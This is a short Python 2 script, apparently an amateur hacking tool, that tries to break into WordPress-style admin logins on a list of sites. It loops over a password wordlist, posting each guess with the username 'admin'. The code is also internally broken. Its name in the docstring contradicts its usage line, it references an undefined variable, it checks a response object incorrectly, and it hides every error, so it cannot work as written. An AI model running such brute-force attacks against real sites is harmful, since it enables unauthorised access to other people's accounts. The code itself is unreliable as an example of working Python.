#!/usr/bin/env python2
# -*- coding: utf-8 -*-
#
#

"""
dorkScanner.py, find sites from dorks.

Usage:
	~$ python2 bruteForce.py sites.txt pwds.txt

	// Brute force process will be started"
"""

__author__ = "Black Viking"
__date__   = "16.04.2017"

import sys
import requests

found = []

def brute(site, password):
	''' Try login to site with username:password '''

	try:
		payload = {"log": "admin", "pwd": password}
		text = requests.post(site, data=payload, timeout=5)

		if "dashboard" in text:
			print "\n"+"-*60"+"[+] Site: %s\n\t[*] Username:%s\n\t[*] Password: %s\n"%(site, username, password) + "-"*60
			found.append((site, username, password))
			return
	except:
		return


if __name__ == '__main__':
	''' When script runs directly '''
	try:
		sites     = open(sys.argv[1], "r").read().split("\n")
		passwords = open(sys.argv[2], "r").read().split("\n")
	except Exception as error:
		print "[!] Error: ", error

	for site in sites:
		print "[-] Trying: ", site
		for pwd in passwords:
			brute(site, pwd)
